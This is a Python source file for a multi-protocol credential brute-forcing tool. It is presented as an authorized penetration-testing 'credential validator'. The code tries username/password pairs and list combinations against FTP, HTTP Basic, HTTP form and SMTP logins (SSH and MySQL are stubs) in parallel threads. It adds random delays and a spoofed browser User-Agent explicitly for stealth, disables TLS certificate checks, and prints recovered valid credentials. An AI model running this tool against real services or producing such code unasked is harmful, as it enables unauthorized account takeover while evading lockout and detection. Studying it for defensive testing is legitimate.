#!/usr/bin/env python3
"""
Credential Validator - Multi-Protocol Authentication Testing Tool
==================================================================

A comprehensive credential validation utility supporting multiple protocols
for authorized penetration testing. Tests credentials against various
services with stealth options and in-memory credential handling.

Author: Offensive Security Toolsmith
Version: 1.0.0
License: For authorized security testing only

WARNING: This tool is intended for authorized security assessments only.
Unauthorized authentication attempts are illegal and unethical.
"""

import argparse
import base64
import hashlib
import hmac
import http.client
import socket
import ssl
import sys
import time
import random
import struct
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any, Callable
from datetime import datetime
from abc import ABC, abstractmethod
from enum import Enum


# =============================================================================
# Configuration and Constants
# =============================================================================

DEFAULT_TIMEOUT = 10.0
DEFAULT_THREADS = 5
DEFAULT_DELAY_MIN = 0.5
DEFAULT_DELAY_MAX = 2.0


class Protocol(Enum):
    """Supported authentication protocols."""
    SSH = "ssh"
    FTP = "ftp"
    HTTP_BASIC = "http-basic"
    HTTP_FORM = "http-form"
    SMTP = "smtp"
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    RDP = "rdp"
    SMB = "smb"


class ValidationResult(Enum):
    """Possible validation outcomes."""
    VALID = "valid"
    INVALID = "invalid"
    LOCKED = "locked"
    ERROR = "error"
    TIMEOUT = "timeout"
    UNKNOWN = "unknown"


# =============================================================================
# Data Classes
# =============================================================================

@dataclass
class Credential:
    """Represents a username/password pair."""
    username: str
    password: str
    domain: Optional[str] = None

    def __repr__(self) -> str:
        if self.domain:
            return f"{self.domain}\\{self.username}:{self.password}"
        return f"{self.username}:{self.password}"

    def clear(self) -> None:
        """Securely clear credential from memory."""
        self.username = "x" * len(self.username)
        self.password = "x" * len(self.password)
        if self.domain:
            self.domain = "x" * len(self.domain)


@dataclass
class ValidationAttempt:
    """Result of a credential validation attempt."""
    credential: Credential
    protocol: Protocol
    target: str
    result: ValidationResult
    message: Optional[str] = None
    response_time: Optional[float] = None
    timestamp: datetime = field(default_factory=datetime.now)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "username": self.credential.username,
            "domain": self.credential.domain,
            "protocol": self.protocol.value,
            "target": self.target,
            "result": self.result.value,
            "message": self.message,
            "response_time": self.response_time,
            "timestamp": self.timestamp.isoformat()
        }


@dataclass
class ValidatorConfig:
    """Configuration for credential validation."""
    target: str = ""
    port: Optional[int] = None
    protocol: Protocol = Protocol.SSH
    credentials: List[Credential] = field(default_factory=list)
    timeout: float = DEFAULT_TIMEOUT
    threads: int = DEFAULT_THREADS
    delay_min: float = DEFAULT_DELAY_MIN
    delay_max: float = DEFAULT_DELAY_MAX
    stop_on_success: bool = False
    verbose: bool = False
    plan_mode: bool = False
    # Protocol-specific options
    http_path: str = "/login"
    http_method: str = "POST"
    http_user_field: str = "username"
    http_pass_field: str = "password"
    http_success_string: Optional[str] = None
    http_failure_string: Optional[str] = None


# =============================================================================
# Protocol Validators
# =============================================================================

class ProtocolValidator(ABC):
    """Abstract base class for protocol-specific validators."""

    @property
    @abstractmethod
    def name(self) -> str:
        """Protocol name."""
        pass

    @property
    @abstractmethod
    def default_port(self) -> int:
        """Default port for this protocol."""
        pass

    @abstractmethod
    def validate(self, target: str, port: int, credential: Credential,
                 config: ValidatorConfig) -> ValidationAttempt:
        """Validate a credential against the target."""
        pass


class SSHValidator(ProtocolValidator):
    """
    SSH credential validation.

    Uses socket-based banner exchange to attempt authentication.
    Note: Full SSH auth requires paramiko or similar library.
    This implementation provides a framework for extension.
    """

    @property
    def name(self) -> str:
        return "SSH"

    @property
    def default_port(self) -> int:
        return 22

    def validate(self, target: str, port: int, credential: Credential,
                 config: ValidatorConfig) -> ValidationAttempt:
        """Validate SSH credentials."""
        start_time = time.time()

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(config.timeout)
            sock.connect((target, port))

            # Receive banner
            banner = sock.recv(1024)

            if not banner.startswith(b'SSH-'):
                sock.close()
                return ValidationAttempt(
                    credential=credential,
                    protocol=Protocol.SSH,
                    target=f"{target}:{port}",
                    result=ValidationResult.ERROR,
                    message="Not an SSH service"
                )

            # Send client banner
            sock.send(b"SSH-2.0-OpenSSH_Client\r\n")

            # Note: Full SSH authentication requires implementing
            # the SSH protocol or using a library like paramiko.
            # This is a framework placeholder.

            sock.close()

            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.SSH,
                target=f"{target}:{port}",
                result=ValidationResult.UNKNOWN,
                message="SSH validation requires paramiko library",
                response_time=time.time() - start_time
            )

        except socket.timeout:
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.SSH,
                target=f"{target}:{port}",
                result=ValidationResult.TIMEOUT
            )
        except Exception as e:
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.SSH,
                target=f"{target}:{port}",
                result=ValidationResult.ERROR,
                message=str(e)
            )


class FTPValidator(ProtocolValidator):
    """FTP credential validation."""

    @property
    def name(self) -> str:
        return "FTP"

    @property
    def default_port(self) -> int:
        return 21

    def validate(self, target: str, port: int, credential: Credential,
                 config: ValidatorConfig) -> ValidationAttempt:
        """Validate FTP credentials."""
        start_time = time.time()

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(config.timeout)
            sock.connect((target, port))

            # Receive banner
            banner = sock.recv(1024).decode('utf-8', errors='ignore')

            if not banner.startswith('220'):
                sock.close()
                return ValidationAttempt(
                    credential=credential,
                    protocol=Protocol.FTP,
                    target=f"{target}:{port}",
                    result=ValidationResult.ERROR,
                    message="Not an FTP service"
                )

            # Send USER command
            sock.send(f"USER {credential.username}\r\n".encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')

            if response.startswith('331'):  # Password required
                # Send PASS command
                sock.send(f"PASS {credential.password}\r\n".encode())
                response = sock.recv(1024).decode('utf-8', errors='ignore')

                if response.startswith('230'):  # Login successful
                    sock.send(b"QUIT\r\n")
                    sock.close()
                    return ValidationAttempt(
                        credential=credential,
                        protocol=Protocol.FTP,
                        target=f"{target}:{port}",
                        result=ValidationResult.VALID,
                        message="FTP login successful",
                        response_time=time.time() - start_time
                    )
                elif response.startswith('530'):  # Login failed
                    sock.close()
                    return ValidationAttempt(
                        credential=credential,
                        protocol=Protocol.FTP,
                        target=f"{target}:{port}",
                        result=ValidationResult.INVALID,
                        message="Invalid credentials",
                        response_time=time.time() - start_time
                    )

            sock.close()
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.FTP,
                target=f"{target}:{port}",
                result=ValidationResult.UNKNOWN,
                message=f"Unexpected response: {response[:50]}"
            )

        except socket.timeout:
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.FTP,
                target=f"{target}:{port}",
                result=ValidationResult.TIMEOUT
            )
        except Exception as e:
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.FTP,
                target=f"{target}:{port}",
                result=ValidationResult.ERROR,
                message=str(e)
            )


class HTTPBasicValidator(ProtocolValidator):
    """HTTP Basic Authentication validator."""

    @property
    def name(self) -> str:
        return "HTTP Basic Auth"

    @property
    def default_port(self) -> int:
        return 80

    def validate(self, target: str, port: int, credential: Credential,
                 config: ValidatorConfig) -> ValidationAttempt:
        """Validate HTTP Basic Auth credentials."""
        start_time = time.time()

        try:
            # Determine if HTTPS
            use_ssl = port == 443

            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(target, port, timeout=config.timeout, context=context)
            else:
                conn = http.client.HTTPConnection(target, port, timeout=config.timeout)

            # Create Basic Auth header
            auth_string = f"{credential.username}:{credential.password}"
            auth_bytes = base64.b64encode(auth_string.encode()).decode()

            headers = {
                "Authorization": f"Basic {auth_bytes}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Connection": "close"
            }

            conn.request("GET", config.http_path, headers=headers)
            response = conn.getresponse()
            body = response.read()
            conn.close()

            response_time = time.time() - start_time

            if response.status == 200:
                return ValidationAttempt(
                    credential=credential,
                    protocol=Protocol.HTTP_BASIC,
                    target=f"{target}:{port}{config.http_path}",
                    result=ValidationResult.VALID,
                    message="HTTP 200 - Authentication successful",
                    response_time=response_time
                )
            elif response.status == 401:
                return ValidationAttempt(
                    credential=credential,
                    protocol=Protocol.HTTP_BASIC,
                    target=f"{target}:{port}{config.http_path}",
                    result=ValidationResult.INVALID,
                    message="HTTP 401 - Invalid credentials",
                    response_time=response_time
                )
            elif response.status == 403:
                return ValidationAttempt(
                    credential=credential,
                    protocol=Protocol.HTTP_BASIC,
                    target=f"{target}:{port}{config.http_path}",
                    result=ValidationResult.LOCKED,
                    message="HTTP 403 - Access forbidden (possibly locked)",
                    response_time=response_time
                )
            else:
                return ValidationAttempt(
                    credential=credential,
                    protocol=Protocol.HTTP_BASIC,
                    target=f"{target}:{port}{config.http_path}",
                    result=ValidationResult.UNKNOWN,
                    message=f"HTTP {response.status}",
                    response_time=response_time
                )

        except socket.timeout:
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.HTTP_BASIC,
                target=f"{target}:{port}",
                result=ValidationResult.TIMEOUT
            )
        except Exception as e:
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.HTTP_BASIC,
                target=f"{target}:{port}",
                result=ValidationResult.ERROR,
                message=str(e)
            )


class HTTPFormValidator(ProtocolValidator):
    """HTTP Form-based authentication validator."""

    @property
    def name(self) -> str:
        return "HTTP Form Auth"

    @property
    def default_port(self) -> int:
        return 80

    def validate(self, target: str, port: int, credential: Credential,
                 config: ValidatorConfig) -> ValidationAttempt:
        """Validate HTTP form-based credentials."""
        start_time = time.time()

        try:
            use_ssl = port == 443

            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(target, port, timeout=config.timeout, context=context)
            else:
                conn = http.client.HTTPConnection(target, port, timeout=config.timeout)

            # Build form data
            import urllib.parse
            form_data = urllib.parse.urlencode({
                config.http_user_field: credential.username,
                config.http_pass_field: credential.password
            })

            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Connection": "close"
            }

            conn.request(config.http_method, config.http_path, form_data, headers)
            response = conn.getresponse()
            body = response.read().decode('utf-8', errors='ignore')
            conn.close()

            response_time = time.time() - start_time

            # Analyze response
            result = ValidationResult.UNKNOWN

            # Check for success string
            if config.http_success_string and config.http_success_string in body:
                result = ValidationResult.VALID
            # Check for failure string
            elif config.http_failure_string and config.http_failure_string in body:
                result = ValidationResult.INVALID
            # Check status code and redirects
            elif response.status in [200, 302]:
                location = response.getheader('Location', '')
                if 'dashboard' in location or 'home' in location or 'welcome' in body.lower():
                    result = ValidationResult.VALID
                elif 'invalid' in body.lower() or 'incorrect' in body.lower() or 'failed' in body.lower():
                    result = ValidationResult.INVALID

            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.HTTP_FORM,
                target=f"{target}:{port}{config.http_path}",
                result=result,
                message=f"HTTP {response.status}",
                response_time=response_time
            )

        except socket.timeout:
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.HTTP_FORM,
                target=f"{target}:{port}",
                result=ValidationResult.TIMEOUT
            )
        except Exception as e:
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.HTTP_FORM,
                target=f"{target}:{port}",
                result=ValidationResult.ERROR,
                message=str(e)
            )


class SMTPValidator(ProtocolValidator):
    """SMTP authentication validator."""

    @property
    def name(self) -> str:
        return "SMTP"

    @property
    def default_port(self) -> int:
        return 25

    def validate(self, target: str, port: int, credential: Credential,
                 config: ValidatorConfig) -> ValidationAttempt:
        """Validate SMTP credentials."""
        start_time = time.time()

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(config.timeout)
            sock.connect((target, port))

            # Receive banner
            banner = sock.recv(1024).decode('utf-8', errors='ignore')

            if not banner.startswith('220'):
                sock.close()
                return ValidationAttempt(
                    credential=credential,
                    protocol=Protocol.SMTP,
                    target=f"{target}:{port}",
                    result=ValidationResult.ERROR,
                    message="Not an SMTP service"
                )

            # Send EHLO
            sock.send(f"EHLO test\r\n".encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')

            # Check for AUTH support
            if 'AUTH' not in response:
                sock.close()
                return ValidationAttempt(
                    credential=credential,
                    protocol=Protocol.SMTP,
                    target=f"{target}:{port}",
                    result=ValidationResult.ERROR,
                    message="SMTP AUTH not supported"
                )

            # Try AUTH LOGIN
            sock.send(b"AUTH LOGIN\r\n")
            response = sock.recv(1024).decode('utf-8', errors='ignore')

            if response.startswith('334'):
                # Send username (base64)
                sock.send(base64.b64encode(credential.username.encode()) + b"\r\n")
                response = sock.recv(1024).decode('utf-8', errors='ignore')

                if response.startswith('334'):
                    # Send password (base64)
                    sock.send(base64.b64encode(credential.password.encode()) + b"\r\n")
                    response = sock.recv(1024).decode('utf-8', errors='ignore')

                    sock.send(b"QUIT\r\n")
                    sock.close()

                    if response.startswith('235'):
                        return ValidationAttempt(
                            credential=credential,
                            protocol=Protocol.SMTP,
                            target=f"{target}:{port}",
                            result=ValidationResult.VALID,
                            message="SMTP authentication successful",
                            response_time=time.time() - start_time
                        )
                    elif response.startswith('535'):
                        return ValidationAttempt(
                            credential=credential,
                            protocol=Protocol.SMTP,
                            target=f"{target}:{port}",
                            result=ValidationResult.INVALID,
                            message="Invalid credentials",
                            response_time=time.time() - start_time
                        )

            sock.close()
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.SMTP,
                target=f"{target}:{port}",
                result=ValidationResult.UNKNOWN,
                message="Unexpected SMTP response"
            )

        except socket.timeout:
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.SMTP,
                target=f"{target}:{port}",
                result=ValidationResult.TIMEOUT
            )
        except Exception as e:
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.SMTP,
                target=f"{target}:{port}",
                result=ValidationResult.ERROR,
                message=str(e)
            )


class MySQLValidator(ProtocolValidator):
    """MySQL authentication validator."""

    @property
    def name(self) -> str:
        return "MySQL"

    @property
    def default_port(self) -> int:
        return 3306

    def validate(self, target: str, port: int, credential: Credential,
                 config: ValidatorConfig) -> ValidationAttempt:
        """
        Validate MySQL credentials.

        Note: Full MySQL auth requires implementing the native auth protocol.
        This provides the framework structure.
        """
        start_time = time.time()

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(config.timeout)
            sock.connect((target, port))

            # Receive greeting packet
            greeting = sock.recv(1024)

            if len(greeting) < 5:
                sock.close()
                return ValidationAttempt(
                    credential=credential,
                    protocol=Protocol.MYSQL,
                    target=f"{target}:{port}",
                    result=ValidationResult.ERROR,
                    message="Invalid MySQL greeting"
                )

            # Check protocol version
            protocol = greeting[4]
            if protocol != 10:
                sock.close()
                return ValidationAttempt(
                    credential=credential,
                    protocol=Protocol.MYSQL,
                    target=f"{target}:{port}",
                    result=ValidationResult.ERROR,
                    message=f"Unsupported MySQL protocol: {protocol}"
                )

            sock.close()

            # Note: Full implementation requires mysql_native_password auth
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.MYSQL,
                target=f"{target}:{port}",
                result=ValidationResult.UNKNOWN,
                message="MySQL validation requires full protocol implementation",
                response_time=time.time() - start_time
            )

        except socket.timeout:
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.MYSQL,
                target=f"{target}:{port}",
                result=ValidationResult.TIMEOUT
            )
        except Exception as e:
            return ValidationAttempt(
                credential=credential,
                protocol=Protocol.MYSQL,
                target=f"{target}:{port}",
                result=ValidationResult.ERROR,
                message=str(e)
            )


# =============================================================================
# Credential Validator Core
# =============================================================================

class CredentialValidator:
    """
    Main credential validation engine.

    Coordinates protocol validators, threading, and result aggregation
    with operational security considerations.
    """

    VALIDATORS: Dict[Protocol, type] = {
        Protocol.SSH: SSHValidator,
        Protocol.FTP: FTPValidator,
        Protocol.HTTP_BASIC: HTTPBasicValidator,
        Protocol.HTTP_FORM: HTTPFormValidator,
        Protocol.SMTP: SMTPValidator,
        Protocol.MYSQL: MySQLValidator,
    }

    def __init__(self, config: ValidatorConfig):
        self.config = config
        self.results: List[ValidationAttempt] = []
        self._stop_event = threading.Event()
        self._lock = threading.Lock()
        self._success_found = False

        # Get appropriate validator
        validator_class = self.VALIDATORS.get(config.protocol)
        if validator_class:
            self._validator = validator_class()
        else:
            raise ValueError(f"Unsupported protocol: {config.protocol}")

        # Determine port
        self._port = config.port or self._validator.default_port

    def _apply_jitter(self) -> None:
        """Apply random delay for stealth."""
        if self.config.delay_max > 0:
            delay = random.uniform(self.config.delay_min, self.config.delay_max)
            time.sleep(delay)

    def _validate_credential(self, credential: Credential) -> Optional[ValidationAttempt]:
        """
        Validate a single credential.

        Args:
            credential: Credential to validate

        Returns:
            ValidationAttempt result
        """
        if self._stop_event.is_set():
            return None

        if self.config.stop_on_success and self._success_found:
            return None

        self._apply_jitter()

        result = self._validator.validate(
            self.config.target,
            self._port,
            credential,
            self.config
        )

        if result.result == ValidationResult.VALID:
            with self._lock:
                self._success_found = True

        return result

    def validate(self) -> List[ValidationAttempt]:
        """
        Execute credential validation.

        Returns:
            List of ValidationAttempt results
        """
        if self.config.verbose:
            print(f"[*] Validating {len(self.config.credentials)} credentials against "
                  f"{self.config.target}:{self._port} ({self.config.protocol.value})")

        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = {executor.submit(self._validate_credential, cred): cred
                      for cred in self.config.credentials}

            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        with self._lock:
                            self.results.append(result)
                            if self.config.verbose:
                                status = "[+]" if result.result == ValidationResult.VALID else "[-]"
                                print(f"{status} {result.credential.username} - {result.result.value}")
                except Exception as e:
                    if self.config.verbose:
                        print(f"[!] Validation error: {e}")

        return self.results

    def stop(self) -> None:
        """Signal the validator to stop."""
        self._stop_event.set()

    def get_valid_credentials(self) -> List[ValidationAttempt]:
        """Return only valid credential attempts."""
        return [r for r in self.results if r.result == ValidationResult.VALID]


# =============================================================================
# Planning Mode
# =============================================================================

def print_plan(config: ValidatorConfig) -> None:
    """Display execution plan without performing any actions."""
    validator_class = CredentialValidator.VALIDATORS.get(config.protocol)
    if validator_class:
        validator = validator_class()
        default_port = validator.default_port
    else:
        default_port = 0

    port = config.port or default_port

    print("""
[PLAN MODE] Tool: credential-validator
================================================================================
""")

    print("TARGET INFORMATION")
    print("-" * 40)
    print(f"  Target:          {config.target}")
    print(f"  Port:            {port}")
    print(f"  Protocol:        {config.protocol.value}")
    print()

    print("VALIDATION CONFIGURATION")
    print("-" * 40)
    print(f"  Credentials:     {len(config.credentials)}")
    print(f"  Threads:         {config.threads}")
    print(f"  Timeout:         {config.timeout}s")
    print(f"  Delay Range:     {config.delay_min}s - {config.delay_max}s")
    print(f"  Stop on Success: {config.stop_on_success}")
    print()

    if config.protocol in [Protocol.HTTP_BASIC, Protocol.HTTP_FORM]:
        print("HTTP-SPECIFIC OPTIONS")
        print("-" * 40)
        print(f"  Path:            {config.http_path}")
        print(f"  Method:          {config.http_method}")
        if config.protocol == Protocol.HTTP_FORM:
            print(f"  User Field:      {config.http_user_field}")
            print(f"  Pass Field:      {config.http_pass_field}")
        print()

    print("CREDENTIAL PREVIEW (first 5)")
    print("-" * 40)
    for cred in config.credentials[:5]:
        masked_pass = '*' * min(len(cred.password), 8)
        print(f"  - {cred.username}:{masked_pass}")
    if len(config.credentials) > 5:
        print(f"  ... and {len(config.credentials) - 5} more")
    print()

    print("ACTIONS TO BE PERFORMED")
    print("-" * 40)
    print("  1. For each credential pair:")
    print(f"     - Apply random delay ({config.delay_min}s - {config.delay_max}s)")
    print(f"     - Attempt {config.protocol.value} authentication")
    print("     - Analyze response for success/failure")
    if config.stop_on_success:
        print("     - Stop immediately if valid credential found")
    print("  2. Aggregate results in memory")
    print("  3. Clear credential data after completion")
    print()

    print("RISK ASSESSMENT")
    print("-" * 40)
    risk_factors = []

    if len(config.credentials) > 50:
        risk_factors.append("Large credential list may trigger lockouts")
    if config.delay_max < 1.0:
        risk_factors.append("Low delay increases lockout risk")
    if config.threads > 5:
        risk_factors.append("Multiple threads may appear as attack")
    if not config.stop_on_success:
        risk_factors.append("Continued testing after success may be suspicious")

    risk_level = "MEDIUM"  # Auth testing is inherently risky
    if len(risk_factors) >= 2:
        risk_level = "HIGH"

    print(f"  Risk Level: {risk_level}")
    for factor in risk_factors:
        print(f"    - {factor}")
    print()

    print("DETECTION VECTORS")
    print("-" * 40)
    print("  - Authentication logs will record all attempts")
    print("  - Failed logins may trigger account lockout")
    print("  - Security systems may alert on multiple failures")
    print("  - Source IP will be logged with each attempt")
    print()

    print("OPSEC CONSIDERATIONS")
    print("-" * 40)
    print("  - Credentials handled in-memory only")
    print("  - Passwords not logged to disk")
    print("  - Use appropriate delays to avoid detection")
    print("  - Consider account lockout policies")
    print()

    print("=" * 80)
    print("No actions will be taken. Remove --plan flag to execute.")
    print("=" * 80)


# =============================================================================
# Documentation Hooks
# =============================================================================

def get_documentation() -> Dict[str, Any]:
    """Return structured documentation for integration."""
    return {
        "name": "credential-validator",
        "version": "1.0.0",
        "category": "credential-operations",
        "description": "Multi-protocol credential validation tool",
        "author": "Offensive Security Toolsmith",
        "license": "Authorized security testing only",
        "features": [
            "Multiple protocol support",
            "In-memory credential handling",
            "Configurable delays for stealth",
            "Stop-on-success option",
            "Account lockout awareness",
            "Planning mode for operation preview"
        ],
        "supported_protocols": [
            "SSH", "FTP", "HTTP Basic Auth", "HTTP Form Auth",
            "SMTP", "MySQL"
        ],
        "arguments": {
            "target": {
                "type": "string",
                "required": True,
                "description": "Target host or IP"
            },
            "--protocol": {
                "type": "string",
                "required": True,
                "choices": ["ssh", "ftp", "http-basic", "http-form", "smtp", "mysql"],
                "description": "Authentication protocol"
            },
            "--credentials": {
                "type": "string",
                "description": "Credential file (user:pass format)"
            },
            "--username": {
                "type": "string",
                "description": "Single username to test"
            },
            "--password": {
                "type": "string",
                "description": "Single password to test"
            },
            "--stop-on-success": {
                "type": "bool",
                "default": False,
                "description": "Stop testing after first valid credential"
            },
            "--plan": {
                "type": "bool",
                "default": False,
                "description": "Show execution plan without testing"
            }
        }
    }


# =============================================================================
# CLI Interface
# =============================================================================

def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Credential Validator - Multi-Protocol Authentication Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 192.168.1.1 --protocol ftp -u admin -P password --plan
  %(prog)s target.com --protocol http-basic --credentials creds.txt
  %(prog)s 10.0.0.1 --protocol smtp -u user@domain.com -P pass123

WARNING: Use only for authorized security testing.
        """
    )

    parser.add_argument(
        "target",
        help="Target host or IP address"
    )

    parser.add_argument(
        "--protocol",
        choices=["ssh", "ftp", "http-basic", "http-form", "smtp", "mysql"],
        required=True,
        help="Authentication protocol to test"
    )

    parser.add_argument(
        "--port",
        type=int,
        help="Target port (default: protocol-specific)"
    )

    parser.add_argument(
        "-c", "--credentials",
        help="File with credentials (user:pass format, one per line)"
    )

    parser.add_argument(
        "-u", "--username",
        help="Single username to test"
    )

    parser.add_argument(
        "-P", "--password",
        help="Single password to test"
    )

    parser.add_argument(
        "-U", "--userlist",
        help="File with usernames (one per line)"
    )

    parser.add_argument(
        "-W", "--passlist",
        help="File with passwords (one per line)"
    )

    parser.add_argument(
        "-t", "--threads",
        type=int,
        default=DEFAULT_THREADS,
        help=f"Number of concurrent threads (default: {DEFAULT_THREADS})"
    )

    parser.add_argument(
        "--timeout",
        type=float,
        default=DEFAULT_TIMEOUT,
        help=f"Connection timeout in seconds (default: {DEFAULT_TIMEOUT})"
    )

    parser.add_argument(
        "--delay-min",
        type=float,
        default=DEFAULT_DELAY_MIN,
        help=f"Minimum delay between attempts (default: {DEFAULT_DELAY_MIN})"
    )

    parser.add_argument(
        "--delay-max",
        type=float,
        default=DEFAULT_DELAY_MAX,
        help=f"Maximum delay between attempts (default: {DEFAULT_DELAY_MAX})"
    )

    parser.add_argument(
        "--stop-on-success",
        action="store_true",
        help="Stop after finding valid credentials"
    )

    # HTTP-specific options
    parser.add_argument(
        "--http-path",
        default="/login",
        help="HTTP path for authentication (default: /login)"
    )

    parser.add_argument(
        "--http-method",
        default="POST",
        help="HTTP method for form auth (default: POST)"
    )

    parser.add_argument(
        "--http-user-field",
        default="username",
        help="Form field name for username (default: username)"
    )

    parser.add_argument(
        "--http-pass-field",
        default="password",
        help="Form field name for password (default: password)"
    )

    parser.add_argument(
        "--http-success",
        help="String that indicates successful login"
    )

    parser.add_argument(
        "--http-failure",
        help="String that indicates failed login"
    )

    parser.add_argument(
        "-p", "--plan",
        action="store_true",
        help="Show execution plan without testing"
    )

    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )

    parser.add_argument(
        "-o", "--output",
        help="Output file for results (JSON format)"
    )

    return parser.parse_args()


def load_credentials(args) -> List[Credential]:
    """Load credentials from arguments and files."""
    credentials = []

    # Load from credentials file
    if args.credentials:
        try:
            with open(args.credentials, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        parts = line.split(':', 1)
                        credentials.append(Credential(parts[0], parts[1]))
        except Exception as e:
            print(f"[!] Error loading credentials file: {e}")

    # Single credential
    if args.username and args.password:
        credentials.append(Credential(args.username, args.password))

    # Username list + password list (cartesian product)
    if args.userlist and args.passlist:
        try:
            with open(args.userlist, 'r') as f:
                users = [line.strip() for line in f if line.strip()]
            with open(args.passlist, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            for user in users:
                for password in passwords:
                    credentials.append(Credential(user, password))
        except Exception as e:
            print(f"[!] Error loading user/password lists: {e}")

    return credentials


def main() -> int:
    """Main entry point."""
    args = parse_arguments()

    # Map protocol string to enum
    protocol_map = {
        "ssh": Protocol.SSH,
        "ftp": Protocol.FTP,
        "http-basic": Protocol.HTTP_BASIC,
        "http-form": Protocol.HTTP_FORM,
        "smtp": Protocol.SMTP,
        "mysql": Protocol.MYSQL,
    }
    protocol = protocol_map.get(args.protocol)

    # Load credentials
    credentials = load_credentials(args)

    if not credentials and not args.plan:
        print("[!] No credentials specified")
        print("[*] Use -u/-P for single credential, -c for file, or -U/-W for lists")
        return 1

    # Build configuration
    config = ValidatorConfig(
        target=args.target,
        port=args.port,
        protocol=protocol,
        credentials=credentials,
        timeout=args.timeout,
        threads=args.threads,
        delay_min=args.delay_min,
        delay_max=args.delay_max,
        stop_on_success=args.stop_on_success,
        verbose=args.verbose,
        plan_mode=args.plan,
        http_path=args.http_path,
        http_method=args.http_method,
        http_user_field=args.http_user_field,
        http_pass_field=args.http_pass_field,
        http_success_string=args.http_success,
        http_failure_string=args.http_failure
    )

    # Planning mode
    if config.plan_mode:
        # Use dummy credentials for plan display
        if not config.credentials:
            config.credentials = [Credential("user", "password")]
        print_plan(config)
        return 0

    # Execute validation
    print(f"[*] Credential Validator starting...")
    print(f"[*] Target: {config.target}")
    print(f"[*] Protocol: {config.protocol.value}")
    print(f"[*] Credentials: {len(config.credentials)}")

    validator = CredentialValidator(config)

    try:
        results = validator.validate()
        valid_creds = validator.get_valid_credentials()

        # Display results
        print()
        print("=" * 60)
        print("VALIDATION RESULTS")
        print("=" * 60)
        print(f"Total tested:    {len(results)}")
        print(f"Valid:           {len(valid_creds)}")
        print(f"Invalid:         {len([r for r in results if r.result == ValidationResult.INVALID])}")
        print(f"Errors:          {len([r for r in results if r.result == ValidationResult.ERROR])}")
        print()

        if valid_creds:
            print("VALID CREDENTIALS:")
            print("-" * 60)
            for result in valid_creds:
                print(f"  [+] {result.credential.username}:{result.credential.password}")

        # Clear credentials from memory
        for cred in credentials:
            cred.clear()

        # Output to file if requested (without passwords)
        if args.output:
            import json
            output_data = {
                "target": config.target,
                "protocol": config.protocol.value,
                "timestamp": datetime.now().isoformat(),
                "results": [r.to_dict() for r in results]
            }
            with open(args.output, 'w') as f:
                json.dump(output_data, f, indent=2)
            print(f"\n[*] Results saved to {args.output}")

        return 0

    except KeyboardInterrupt:
        print("\n[!] Validation interrupted by user")
        validator.stop()
        return 130


if __name__ == "__main__":
    sys.exit(main())
